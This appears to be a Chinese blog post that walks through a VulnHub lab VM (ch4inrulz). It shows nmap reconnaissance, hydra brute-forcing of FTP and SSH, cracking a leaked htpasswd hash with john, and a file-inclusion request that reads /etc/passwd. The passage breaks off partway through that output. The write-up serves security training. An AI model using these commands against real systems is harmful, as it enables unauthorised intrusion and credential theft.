@@ -1,0 +1,874 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+    
+
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Microsoft YaHei:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="文章," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="环境部署下载地址，文件大小:576M  由于该网站引用的jquery需要翻墙，所以看不到下载链接，可以在浏览器f12开发者模式中调试后看到，下载过程不需要翻墙。  下载之后使用Vmware或者VirtualBox打开即可。  靶机是Ubuntu系统，攻击机使用Kali，两者均为虚拟机且在同一网段下，本机Kali的IP为10.0.2.4。">
+<meta name="keywords" content="文章">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试靶机ch4inrulz实战总结">
+<meta property="og:url" content="http://yoursite.com/2019/05/15/渗透测试靶机ch4inrulz实战总结/index.html">
+<meta property="og:site_name" content="zgjx6的博客">
+<meta property="og:description" content="环境部署下载地址，文件大小:576M  由于该网站引用的jquery需要翻墙，所以看不到下载链接，可以在浏览器f12开发者模式中调试后看到，下载过程不需要翻墙。  下载之后使用Vmware或者VirtualBox打开即可。  靶机是Ubuntu系统，攻击机使用Kali，两者均为虚拟机且在同一网段下，本机Kali的IP为10.0.2.4。">
+<meta property="og:updated_time" content="2019-06-11T09:20:41.636Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="渗透测试靶机ch4inrulz实战总结">
+<meta name="twitter:description" content="环境部署下载地址，文件大小:576M  由于该网站引用的jquery需要翻墙，所以看不到下载链接，可以在浏览器f12开发者模式中调试后看到，下载过程不需要翻墙。  下载之后使用Vmware或者VirtualBox打开即可。  靶机是Ubuntu系统，攻击机使用Kali，两者均为虚拟机且在同一网段下，本机Kali的IP为10.0.2.4。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"hide","offset":12,"offset_float":0,"b2t":true,"scrollpercent":true},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/05/15/渗透测试靶机ch4inrulz实战总结/"/>
+
+
+
+
+
+  <title>渗透测试靶机ch4inrulz实战总结 | zgjx6的博客</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">zgjx6的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">....-/.----/-..../...--/--.../...--/--.../....-/---../.----/----./....-/----./..---/----./...--/----./.----</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/15/渗透测试靶机ch4inrulz实战总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zgjx6">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/user.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zgjx6的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">渗透测试靶机ch4inrulz实战总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-15T14:34:23+08:00">
+                2019-05-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/文章/" itemprop="url" rel="index">
+                    <span itemprop="name">文章</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h3><p><a href="https://www.vulnhub.com/entry/ch4inrulz-101,247/" target="_blank" rel="external">下载地址</a>，文件大小:576M</p>
+<blockquote>
+<p>由于该网站引用的jquery需要翻墙，所以看不到下载链接，可以在浏览器f12开发者模式中调试后看到，下载过程不需要翻墙。</p>
+</blockquote>
+<p>下载之后使用<code>Vmware</code>或者<code>VirtualBox</code>打开即可。</p>
+<blockquote>
+<p>靶机是Ubuntu系统，攻击机使用Kali，两者均为虚拟机且在同一网段下，本机Kali的IP为10.0.2.4。</p>
+</blockquote>
+<a id="more"></a>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><h5 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h5><p>由于靶机网络开启了DHCP，故第一步需要先探测其IP。一般可使用以下任一方法：</p>
+<ul>
+<li>netdiscover -r 10.0.2.0/24</li>
+<li>arp-scan -l</li>
+<li>nmap -sP 10.0.2.0/24</li>
+</ul>
+<p>可以得到靶机IP为<code>10.0.2.5</code>。</p>
+<h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>端口扫描一般使用<code>Nmap</code>：<code>nmap -sS -sV -O -T4 -A 10.0.2.5</code>,主要结果如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">PORT     STATE SERVICE VERSION</div><div class="line">21/tcp   open  ftp     vsftpd 2.3.5</div><div class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</div><div class="line">| ftp-syst: </div><div class="line">|   STAT: </div><div class="line">| FTP server status:</div><div class="line">|      Connected to 10.0.2.4</div><div class="line">|      Logged in as ftp</div><div class="line">|      TYPE: ASCII</div><div class="line">|      No session bandwidth limit</div><div class="line">|      Session timeout in seconds is 300</div><div class="line">|      Control connection is plain text</div><div class="line">|      Data connections will be plain text</div><div class="line">|      At session startup, client count was 2</div><div class="line">|      vsFTPd 2.3.5 - secure, fast, stable</div><div class="line">|_End of status</div><div class="line">22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)</div><div class="line">| ssh-hostkey: </div><div class="line">|   1024 d4:f8:c1:55:92:75:93:f7:7b:65:dd:2b:94:e8:bb:47 (DSA)</div><div class="line">|   2048 3d:24:ea:4f:a2:2a:ca:63:b7:f4:27:0f:d9:17:03:22 (RSA)</div><div class="line">|_  256 e2:54:a7:c7:ef:aa:8c:15:61:20:bd:aa:72:c0:17:88 (ECDSA)</div><div class="line">80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))</div><div class="line">|_http-server-header: Apache/2.2.22 (Ubuntu)</div><div class="line">|_http-title: FRANK's Website | Under development</div><div class="line">8011/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</div><div class="line">|_http-server-header: Apache/2.2.22 (Ubuntu)</div><div class="line">|_http-title: Site doesn't have a title (text/html).</div><div class="line">MAC Address: 08:00:27:56:8B:91 (Oracle VirtualBox virtual NIC)</div><div class="line">Device type: general purpose</div><div class="line">Running: Linux 2.6.X</div><div class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</div><div class="line">OS details: Linux 2.6.19 - 2.6.36</div><div class="line">Network Distance: 1 hop</div><div class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</div></pre></td></tr></table></figure>
+<p>可以看到开放了21、22、80、8011共4个端口，并且可以看到操作系统为linux，内核版本为2.6。</p>
+<h3 id="系统测试"><a href="#系统测试" class="headerlink" title="系统测试"></a>系统测试</h3><h5 id="系统扫描"><a href="#系统扫描" class="headerlink" title="系统扫描"></a>系统扫描</h5><p>在手工测试之前，一般可先使用扫描器进行扫描以减少工作量，快速发现问题。</p>
+<p>常用的扫描器如：<code>Appscan</code>,<code>AWVS</code>,<code>Nessus</code>,<code>nikto</code>,<code>wafw00f</code>,<code>wapiti</code>等等，不同的扫描器有不同的作用，具体使用哪些可视情况而定。</p>
+<h5 id="服务利用"><a href="#服务利用" class="headerlink" title="服务利用"></a>服务利用</h5><ul>
+<li>服务漏洞探测</li>
+</ul>
+<p>21为FTP服务，版本为<code>vsftpd 2.3.5</code>;22为SSH服务，版本为<code>OpenSSH 5.9p1 Debian 5ubuntu1.10</code>，分别使用<code>searchsploit</code>搜索对应漏洞：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">root@kali:~# searchsploit vsftpd</div><div class="line">------------------------------------------------------------------------------------------------------------ ----------------------------------------</div><div class="line"> Exploit Title                                                                                              |  Path</div><div class="line">                                                                                                            | (/usr/share/exploitdb/)</div><div class="line">------------------------------------------------------------------------------------------------------------ ----------------------------------------</div><div class="line">vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                              | exploits/linux/dos/5814.pl</div><div class="line">vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                              | exploits/windows/dos/31818.sh</div><div class="line">vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                              | exploits/windows/dos/31819.pl</div><div class="line">vsftpd 2.3.2 - Denial of Service                                                                            | exploits/linux/dos/16270.c</div><div class="line">vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                      | exploits/unix/remote/17491.rb</div><div class="line">------------------------------------------------------------------------------------------------------------ ----------------------------------------</div><div class="line">Shellcodes: No Result</div></pre></td></tr></table></figure>
+<p>ssh可使用<code>searchsploit openssh</code> 搜索，同样没有发现相应版本的漏洞。</p>
+<ul>
+<li>弱密码</li>
+</ul>
+<p>一般来说SSH和FTP均使用系统用户名和密码，且默认不开启ROOT权限，所以在没有用户名的情况下，仅能爆破ROOT的弱密码，成功率一般不高。</p>
+<p>暴力破解FTP：<code>hydra -l root -P pass.txt -t 8 -e ns 10.0.2.5 ftp -vV</code></p>
+<p>可以得到提示<code>[INFO] user root does not exist, skipping</code>。</p>
+<ul>
+<li>匿名登录</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">root@kali:~<span class="comment"># ftp 10.0.2.5</span></div><div class="line">Connected to 10.0.2.5.</div><div class="line">220 (vsFTPd 2.3.5)</div><div class="line">Name (10.0.2.5:root): Anonymous</div><div class="line">331 Please specify the password.</div><div class="line">Password:</div><div class="line">230 Login successful.</div><div class="line">Remote system <span class="built_in">type</span> is UNIX.</div><div class="line">Using binary mode to transfer files.</div><div class="line">ftp&gt; ls -al</div><div class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</div><div class="line">150 Here comes the directory listing.</div><div class="line">drwxr-xr-x    2 0        111          4096 Apr 13  2018 .</div><div class="line">drwxr-xr-x    2 0        111          4096 Apr 13  2018 ..</div><div class="line">226 Directory send OK.</div></pre></td></tr></table></figure>
+<p>发现可以登录成功，但进过探索之后没有发现有价值的信息。</p>
+<p>再尝试暴力破解SSH：<code>hydra -l root -P pass.txt -t 8 -e ns 10.0.2.5 ssh -vV</code></p>
+<p>但依然没有成功。</p>
+<h3 id="应用测试"><a href="#应用测试" class="headerlink" title="应用测试"></a>应用测试</h3><h5 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h5><blockquote>
+<p>指纹识别主要是通过一些工具或手工检查Web服务组件类型及版本信息，为后续渗透测试提供方向。  </p>
+<p>常用工具如：<strong>WhatWeb</strong>,<strong>Wapplyzer</strong>,<strong>Whatruns</strong>,<strong>Plecost</strong>,<strong>BlindElephant</strong>等等，不同的工具检测结果可能略有不同，可将多个工具的检测结果结合进行分析。  </p>
+<p>更多指纹识别相关技术可参考：<a href="https://www.freebuf.com/articles/web/202560.html" target="_blank" rel="external">Web指纹识别技术研究与优化实现</a> 。</p>
+</blockquote>
+<p><code>WhatWeb</code>测试结果如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root@kali:~# whatweb http://10.0.2.5</div><div class="line">http://10.0.2.5 [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], Email[name@email.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.0.2.5], JQuery, Script, Title[FRANK's Website | Under development]</div><div class="line">root@kali:~# whatweb http://10.0.2.5:8011</div><div class="line">http://10.0.2.5:8011 [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.0.2.5]</div></pre></td></tr></table></figure>
+<p><code>Wapplyzer</code>测试结果如下：</p>
+<p>80端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">字体脚本</div><div class="line">Font Awesome</div><div class="line">Google Font API</div><div class="line">Web 框架</div><div class="line">Bootstrap4.0.0</div><div class="line">Web 服务器</div><div class="line">Apache2.2.22</div><div class="line">操作系统</div><div class="line">Ubuntu</div><div class="line">JavaScript 库</div><div class="line">jQuery3.3.1</div></pre></td></tr></table></figure>
+<p>8011端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Web 服务器</div><div class="line">Apache2.2.22</div><div class="line">操作系统</div><div class="line">Ubuntu</div></pre></td></tr></table></figure>
+<p>可以看出两者均使用了Apache2.2.22，但尝试搜索Apache此版本的漏洞，没有发现可利用exp。</p>
+<h5 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h5><blockquote>
+<p>目录扫描主要通过暴力扫描路径，以发现一些隐藏文件、网站后台、备份文件等。常用的工具如：<code>DirBuster</code>、<code>御剑</code>、<code>dirb</code>、<code>Dirsearch</code>等。如果有更高的要求，可尝试<a href="https://www.freebuf.com/sectool/200890.html" target="_blank" rel="external">Dirmap：一款高级Web目录文件扫描工具</a> 。</p>
+</blockquote>
+<p>此处使用dirb对80和8011两个端口的服务进行扫描，可以发现80端口存在<code>/development</code>和<code>robots.txt</code>:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">---- Scanning URL: http://10.0.2.5/ ----</div><div class="line">+ http://10.0.2.5/LICENSE (CODE:200|SIZE:1093)                                 </div><div class="line">+ http://10.0.2.5/cgi-bin/ (CODE:403|SIZE:284)                                 </div><div class="line">==&gt; DIRECTORY: http://10.0.2.5/css/                                            </div><div class="line">+ http://10.0.2.5/development (CODE:401|SIZE:475)                              </div><div class="line">==&gt; DIRECTORY: http://10.0.2.5/img/                                            </div><div class="line">+ http://10.0.2.5/index (CODE:200|SIZE:334)                                    </div><div class="line">==&gt; DIRECTORY: http://10.0.2.5/js/                                             </div><div class="line">+ http://10.0.2.5/robots (CODE:200|SIZE:21)                                    </div><div class="line">+ http://10.0.2.5/robots.txt (CODE:200|SIZE:21)                                </div><div class="line">+ http://10.0.2.5/server-status (CODE:403|SIZE:289)                            </div><div class="line">==&gt; DIRECTORY: http://10.0.2.5/vendor/</div></pre></td></tr></table></figure>
+<p>另外使用<code>御剑</code>或<code>nikto</code>可以发现80端口存在<code>index.html.bak</code>:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">root@kali:~# nikto -h http://10.0.2.5</div><div class="line">- Nikto v2.1.6</div><div class="line">---------------------------------------------------------------------------</div><div class="line">+ Target IP:          10.0.2.5</div><div class="line">+ Target Hostname:    10.0.2.5</div><div class="line">+ Target Port:        80</div><div class="line">+ Start Time:         2019-05-14 15:45:21 (GMT8)</div><div class="line">---------------------------------------------------------------------------</div><div class="line">+ Server: Apache/2.2.22 (Ubuntu)</div><div class="line">+ Server leaks inodes via ETags, header found with file /, inode: 1051931, size: 13516, mtime: Sat Apr 14 21:39:32 2018</div><div class="line">+ The anti-clickjacking X-Frame-Options header is not present.</div><div class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div><div class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div><div class="line">+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</div><div class="line">+ Uncommon header 'tcn' found, with contents: list</div><div class="line">+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.html.bak</div><div class="line">+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD </div><div class="line">+ OSVDB-3268: /img/: Directory indexing found.</div><div class="line">+ OSVDB-3092: /img/: This might be interesting...</div><div class="line">+ OSVDB-3233: /icons/README: Apache default file found.</div><div class="line">+ 8497 requests: 0 error(s) and 11 item(s) reported on remote host</div><div class="line">+ End Time:           2019-05-14 15:45:37 (GMT8) (16 seconds)</div><div class="line">---------------------------------------------------------------------------</div><div class="line">+ 1 host(s) tested</div></pre></td></tr></table></figure>
+<p>8011端口扫描结果如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">---- Scanning URL: http://10.0.2.5:8011/ ----</div><div class="line">==&gt; DIRECTORY: http://10.0.2.5:8011/api/                                       </div><div class="line">+ http://10.0.2.5:8011/index.html (CODE:200|SIZE:30)                           </div><div class="line">+ http://10.0.2.5:8011/server-status (CODE:403|SIZE:291)                       </div><div class="line">                                                                               </div><div class="line">---- Entering directory: http://10.0.2.5:8011/api/ ----</div><div class="line">+ http://10.0.2.5:8011/api/index.html (CODE:200|SIZE:351)</div></pre></td></tr></table></figure>
+<p>发现有一个<code>/api</code>目录。</p>
+<h5 id="前端源代码"><a href="#前端源代码" class="headerlink" title="前端源代码"></a>前端源代码</h5><p>分别使用浏览器访问两个网站，查看前端<code>html</code>、<code>css</code>、<code>js</code>等代码，没有发现明显问题。然后查看80端口扫描到的备份文件<code>index.html.bak</code>:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@kali:~# curl http://10.0.2.5/index.html.bak</div><div class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;</div><div class="line">&lt;p&gt;This is the default web page for this server.&lt;/p&gt;</div><div class="line">&lt;p&gt;The web server software is running but no content has been added, yet.&lt;/p&gt;</div><div class="line">&lt;a href="/development"&gt;development&lt;/a&gt;</div><div class="line">&lt;!-- I will use frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0 as the .htpasswd file to protect the development path --&gt;</div><div class="line">&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p>可以看到存在一个hash，使用<a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="external">john the rapper</a>破解：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">root@kali:~# echo 'frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0'&gt;hash.txt</div><div class="line">root@kali:~# cat hash.txt </div><div class="line">frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0</div><div class="line">root@kali:~# john hash.txt</div><div class="line">Using default input encoding: UTF-8</div><div class="line">Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 256/256 AVX2 8x3])</div><div class="line">Will run 2 OpenMP threads</div><div class="line">Proceeding with single, rules:Wordlist</div><div class="line">Press 'q' or Ctrl-C to abort, almost any other key for status</div><div class="line">Warning: Only 22 candidates buffered for the current salt, minimum 48</div><div class="line">needed for performance.</div><div class="line">Warning: Only 33 candidates buffered for the current salt, minimum 48</div><div class="line">needed for performance.</div><div class="line">frank!!!         (frank)</div><div class="line">1g 0:00:00:00 DONE 1/3 (2019-05-14 16:02) 50.00g/s 9950p/s 9950c/s 9950C/s FRANK1..gfrank</div><div class="line">Use the "--show" option to display all of the cracked passwords reliably</div><div class="line">Session completed</div></pre></td></tr></table></figure>
+<p>可以得到账号密码<code>frank/frank!!!</code>。</p>
+<h5 id="漏洞分析及利用"><a href="#漏洞分析及利用" class="headerlink" title="漏洞分析及利用"></a>漏洞分析及利用</h5><ul>
+<li>8011端口服务</li>
+</ul>
+<p>访问<code>http://10.0.2.5:8011/api</code>,发现有提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">This API will be used to communicate with Frank&apos;s server</div><div class="line">but it&apos;s still under development</div><div class="line">* web_api.php</div><div class="line">* records_api.php</div><div class="line">* files_api.php</div><div class="line">* database_api.php</div></pre></td></tr></table></figure>
+<p>依次访问发现只有<code>files_api.php</code>能访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">No parameter called file passed to me</div><div class="line">* Note : this API don&apos;t use json , so send the file name in raw format</div></pre></td></tr></table></figure>
+<p>提示需要<code>file</code>,然后尝试：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@kali:~# curl http://10.0.2.5:8011/api/files_api.php?file=/etc/passwd</div><div class="line">&lt;head&gt;</div><div class="line">  &lt;title&gt;franks website | simple website browser API&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;b&gt;********* HACKER DETECTED *********&lt;/b&gt;&lt;p&gt;YOUR IP IS : 10.0.2.4&lt;/p&gt;&lt;p&gt;WRONG INPUT !!&lt;/p&gt;</div></pre></td></tr></table></figure>
+<p>修改参数名为<code>files</code>, <code>filename</code>，<code>file_name</code>等依然不成功。尝试使用POST：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">root@kali:~# curl -X POST -d "file=/etc/passwd" http://10.0.2.5:8011/api/files_api.php</div><div class="line"></div><div class="line">&lt;head&gt;</div><div class="line">  &lt;title&gt;franks website | simple website browser API&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">bin:x:2:2:bin:/bin:/bin/sh</div><div class="line">sys:x:3:3:sys:/dev:/bin/sh</div><div class="line">sync:x:4:65534:sync:/bin:/bin/sync</div><div class="line">games:x:5:60:games:/usr/games:/bin/sh</div><div class="line">man:x:6:12:man:/var/cache/man:/bin/sh</div><div class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</div><div class="line">mail:x:8:8:mail:/var/mail:/bin/sh</div><div class="line">news:x:9:9:news:/var/spool/news:/bin/sh</div><div class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</div><div class="line">proxy:x:13:13:proxy:/bin:/bin/sh</div><div class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</div><div class="line">backup:x:34:34:backup:/var/backups:/bin/sh</div><div 